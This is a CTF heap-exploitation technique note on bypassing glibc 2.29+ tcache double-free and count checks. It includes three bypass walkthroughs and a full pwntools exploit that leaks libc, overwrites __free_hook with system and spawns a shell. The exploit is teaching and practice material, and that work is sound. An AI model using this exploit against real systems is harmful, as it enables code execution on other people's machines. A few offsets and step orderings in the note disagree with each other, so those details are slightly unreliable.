---
title: "Tcache Key and Count Checks - Getting Your Double Free Back (glibc 2.29+)"
category: pwn
subcategory: heap
type: technique
tags: [tcache, tcache-key, double-free, uaf, fastbin, heap, counts, tcache-perthread-struct, free-hook, house-botcake, pwndbg, gef, pwntools, glibc]
difficulty: medium
summary: "glibc 2.29 added a per-chunk key that detects tcache double frees; clear it, overflow the counts, or route the free into a different bin."
when_to_use:
  - "`free(): double free detected in tcache 2` killed your exploit"
  - "You have a UAF write of at least 16 bytes into a freed chunk"
  - "You want a chunk that is simultaneously live and in a free list on glibc 2.29-2.39"
  - "You need to know why `malloc()` is not returning your poisoned tcache entry"
tools: [pwntools, pwndbg, gef]
related: [heap-double-free, heap-tcache-poisoning, house-botcake, heap-use-after-free, heap-version-differences]
---

## TL;DR

glibc 2.29 stamps every tcache entry with a `key` at `chunk+0x10` and, on `free()`,
scans that bin if the key matches - catching naive double frees. The key is one
qword in memory you usually already control. Zero it, or fill the tcache so the free
takes the fastbin path, or route the second free through consolidation (house of
botcake). 2.34 additionally checks `counts[idx] > 0` before serving.

## Recognise it

- `free(): double free detected in tcache 2` on the second `free(i)`.
- `strings libc.so.6 | grep "GNU C"` reports 2.29 or newer.
- `show()` on a freed chunk returns 16 bytes where the second qword is either the
  `tcache_perthread_struct` address (2.29-2.33) or a high-entropy random value (2.34+).
- A poisoned `entries[]` is ignored and malloc returns a fresh chunk instead -
  that is the `counts[idx] == 0` check on 2.34+.

## Vulnerable code shape

Same bug as always; the mitigation sits in libc, not the program:

```c
void do_free(void) {
    int i = read_idx();
    free(ptr[i]);            /* no NULLing -> double free available */
}

void do_edit(void) {
    int i = read_idx();
    read(0, ptr[i], sz[i]);  /* >= 0x10 bytes -> you can clobber next AND key */
}
```

## Theory

Targets: glibc 2.29 - 2.39.

### The key check (added 2.29)

```c
/* _int_free, tcache branch */
size_t tc_idx = csize2tidx (size);
if (tcache != NULL && tc_idx < mp_.tcache_bins)
  {
    tcache_entry *e = (tcache_entry *) chunk2mem (p);
    if (__glibc_unlikely (e->key == tcache_key))
      {
        tcache_entry *tmp;
        for (tmp = tcache->entries[tc_idx]; tmp; tmp = REVEAL_PTR (tmp->next))
          if (tmp == e)
            malloc_printerr ("free(): double free detected in tcache 2");
      }
    if (tcache->counts[tc_idx] < mp_.tcache_count)
      { tcache_put (p, tc_idx); return; }
  }
```

Read that carefully - it gives you four independent bypasses:

1. **`e->key != tcache_key`** -> the scan never runs. The key lives at
   `chunk_user + 0x8`. Any write of 8 bytes at that offset defeats the check.
   Pre-2.34 `tcache_key` is the address of the `tcache_perthread_struct`; from 2.34
   it is a random value seeded in `tcache_init`. Either way you only need to make it
   *different*, not to predict it.
2. **`counts[tc_idx] == mp_.tcache_count` (7)** -> the whole block is skipped and the
   free falls through to the fastbin / unsorted path, where only the weaker `fasttop`
   check applies. This is why "fill tcache with 7, then fastbin dup" always works.
3. **The scan only walks `entries[tc_idx]`** - the bin for *this* size. If you can
   change the chunk's `size` field between the two frees (heap overflow on the header,
   or an off-by-one), the second free is checked against a different, empty bin.
4. **The scan only reaches chunks linked through `next`.** Corrupt the `next` of the
   head so the list terminates before reaching your chunk and the scan misses it.
   (Useful when you can only write 8 bytes at `+0x0`.)

### The count checks (2.34+)

```c
/* tcache_get, 2.34+ */
if (__glibc_unlikely (tcache->counts[tc_idx] == 0))
  return NULL;   /* falls through to the normal bins */
...
if (__glibc_unlikely (!aligned_OK (e)))
  malloc_printerr ("malloc(): unaligned tcache chunk detected");
```

So if you hand-write `entries[i]` (for example after allocating the
`tcache_perthread_struct` itself) you must also set `counts[i]` to a non-zero value,
and your target must be 16-byte aligned.

`counts` is `uint16_t counts[64]` at offset 0x10 of the struct (2.30+; it was
`char counts[64]` at 0x0 in 2.26-2.29), with `entries[64]` right after at 0x90.

## Attack

**Bypass A - clear the key (needs a >= 0x10-byte UAF edit).** glibc 2.31:

1. `alloc(0, 0x88)` -> A
2. `free(0)` - tcache[7]: A, `A->key = &tcache`
3. `edit(0, p64(0) * 2)` - `A->next = 0`, `A->key = 0`
4. `free(0)` - key mismatch, no scan, A is pushed again. tcache[7]: A -> A, counts = 2
5. `alloc(1, 0x88, p64(target))` - returns A, sets `A->next = target`
6. `alloc(2, 0x88)` - returns A again
7. `alloc(3, 0x88, payload)` - returns `target`

**Bypass B - fill the tcache and use the fastbin.** glibc 2.31, no edit primitive:

1. `alloc(0..6, 0x68)` and `free(0..6)` - tcache[5] is 7/7 full
2. `alloc(7, 0x68)` -> A, `alloc(8, 0x68)` -> B
3. `free(7)` - tcache full, so A goes to `fastbin[5]`
4. `free(8)` - `fastbin[5]`: B -> A
5. `free(7)` - fasttop compares against B, passes. `fastbin[5]`: A -> B -> A
6. `alloc(0..6, 0x68)` - drain tcache; the refill path pulls A, B, A back through tcache
7. Continue with the standard poison

**Bypass C - change the size between the frees (needs a header overflow).**

1. `alloc(0, 0x88)` -> A, `alloc(1, 0x18)` -> H (the chunk *below* A, used to overflow)
2. `free(0)` - tcache[7]: A
3. Overflow from H into A's header, setting `size` from 0x91 to 0xA1
4. `free(0)` - the key matches, but the scan walks `entries[9]` (for 0xA0), which does
   not contain A. Passes. A is now in tcache[7] **and** tcache[9]

## Heap state

```text
Bypass A

step 2   entries[7] -> A
         A +0x00 | next = 0            |
           +0x08 | key  = tcache_key   |   <- tripwire

step 3   A +0x00 | next = 0            |
           +0x08 | key  = 0            |   <- disarmed by edit()

step 4   entries[7] -> A -> A          counts[7] = 2
         A +0x00 | next = A            |
           +0x08 | key  = tcache_key   |   (re-stamped by tcache_put)

step 5-7 malloc -> A ; write A->next = TARGET
         entries[7] -> A -> TARGET
         malloc -> A      (the duplicate)
         malloc -> TARGET


Bypass B

 tcache[5]: [7/7 full]  <- frees bypass the key block entirely
 fastbin[5]: A -> B -> A
              ^ A->fd = B, B->fd = A     (cycle, no key involved)


Bypass C

 before: A.size = 0x91  -> scan of entries[7] finds A -> abort
 after : A.size = 0xa1  -> scan of entries[9] finds nothing -> allowed
 result: A is queued in TWO bins of different sizes (instant overlap)
```

## Exploit

```python
#!/usr/bin/env python3
"""Three tcache-key bypasses for glibc 2.29 - 2.39.

Pick one with an arg:
    ./exploit.py KEY        # clear e->key with a UAF edit          (default)
    ./exploit.py FILL       # saturate tcache, fastbin dup instead
    ./exploit.py SIZE       # change the chunk size between frees
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

BIG = 0x88          # 0x90 chunk, tcache idx 7
FAST = 0x68         # 0x70 chunk, tcache idx 5 / fastbin idx 5

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


# ---------------------------------------------------------------- libc leak
alloc(20, 0x418, b"leaker")
alloc(21, 0x18, b"guard")
free(20)
libc.address = lk(show(20)) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)
TARGET = libc.sym["__free_hook"] if "__free_hook" in libc.sym else libc.sym["_IO_2_1_stdout_"]
log.info("target    = %#x", TARGET)


def bypass_key():
    """Disarm e->key with a 0x10-byte UAF write, then double free normally."""
    alloc(0, BIG, b"A" * 8)
    free(0)
    edit(0, p64(0) * 2)          # next = 0, key = 0 -> detector disarmed
    free(0)                      # tcache[7]: A -> A
    alloc(1, BIG, p64(TARGET))   # returns A, writes A->next
    alloc(2, BIG, b"dup")        # returns A again
    alloc(3, BIG, p64(libc.sym["system"]))   # returns TARGET


def bypass_fill():
    """Saturate tcache so free() skips the key block and uses the fastbin."""
    for i in range(7):
        alloc(i, FAST, b"filler")
    for i in range(7):
        free(i)                  # tcache[5] = 7/7
    alloc(7, FAST, b"A" * 8)
    alloc(8, FAST, b"B" * 8)
    free(7)                      # fastbin[5]: A
    free(8)                      # fastbin[5]: B -> A
    free(7)                      # fasttop head is B -> allowed
    for i in range(7):
        alloc(i, FAST, b"drain")  # empty tcache; refill pulls A,B,A back
    alloc(9, FAST, p64(TARGET))
    alloc(10, FAST, b"pad")
    alloc(11, FAST, b"pad")
    alloc(12, FAST, p64(libc.sym["system"]))


def bypass_size():
    """Overflow A's size header between the two frees so the scan looks elsewhere."""
    alloc(0, 0x18, b"overflower")   # H, sits below A
    alloc(1, BIG, b"A" * 8)         # A, size 0x91
    free(1)                         # tcache[7]: A
    # 0x18 of data + 8 bytes of prev_size reach A's size field.
    edit(0, b"B" * 0x18 + p64(0xA1))
    free(1)                         # scan looks in entries[9], misses A
    log.success("A queued in tcache[7] and tcache[9] simultaneously")
    alloc(2, 0x98, p64(TARGET))     # pulls A out of tcache[9], sets next
    alloc(3, BIG, b"pad")           # pulls A out of tcache[7]
    alloc(4, 0x98, p64(libc.sym["system"]))


if args.FILL:
    bypass_fill()
elif args.SIZE:
    bypass_size()
else:
    bypass_key()

log.success("write landed at %#x", TARGET)
alloc(30, 0x18, b"/bin/sh\x00")
free(30)
io.interactive()
```

## Variants & pitfalls

- **You need 0x10 bytes of write, not 0x8.** A single-qword overwrite at `+0x0`
  (typical of a `strcpy` off-by-eight) only touches `next`. Combine bypass 4 (break
  the scan chain) with that.
- **The re-stamped key.** `tcache_put` writes `e->key = tcache_key` again, so after the
  second successful free the key is back. Clear it again before a *third* free.
- **`counts` underflow.** Pulling more entries than `counts` says used to wrap the
  `uint16_t` to 0xFFFF; on 2.34+ that is caught by `counts[tc_idx] == 0` first, so
  you simply get a normal chunk instead of your poison and the exploit silently fails.
  Always check `pwndbg> tcache` after the poison.
- **Bypass C corrupts the heap.** Two bins now own overlapping memory of *different*
  sizes; the larger one will eventually walk into the next chunk's header. Do the
  arbitrary write immediately and do not free anything else.
- **house of botcake** (see its own file) is the cleanest 2.29-2.34 double free: the
  second free goes through the *unsorted/consolidation* path, which has no key check
  at all, and the result is an overlapping tcache chunk.
- **2.34+ `tcache_key` randomness** does not matter - you never need its value, only
  to make `e->key` differ from it.

## Debugging

```text
pwndbg> tcache                       # counts[] first, entries[] second
pwndbg> p tcache_key                 # 2.34+: the random stamp
pwndbg> p *tcache                    # full struct dump
pwndbg> x/2gx <chunk_user>           # next, key
pwndbg> try_free <chunk_addr>        # tells you WHICH check the next free trips
pwndbg> b malloc_printerr            # break the moment a check fires
pwndbg> bt
gef>  heap bins tcache
```

```bash
# Which check aborted? The message maps 1:1 to a source line.
#   "free(): double free detected in tcache 2"  -> e->key == tcache_key and found in bin
#   "malloc(): unaligned tcache chunk detected" -> target not 16-byte aligned (2.34+)
#   "malloc(): memory corruption (fast)"        -> fake size does not match fastbin idx
strings ./libc.so.6 | grep -n "tcache"
```

## Tools

- `pwndbg try_free` and `pwndbg tcache`.
- `gef heap bins tcache`, `gef heap-analysis-helper`.
- `how2heap` to diff behaviour between two libc versions quickly.

## References

- shellphish `how2heap`: `tcache_dup.c`, `house_of_botcake.c`.
- glibc `malloc/malloc.c`: `_int_free` tcache branch, `tcache_get`, `tcache_init`.
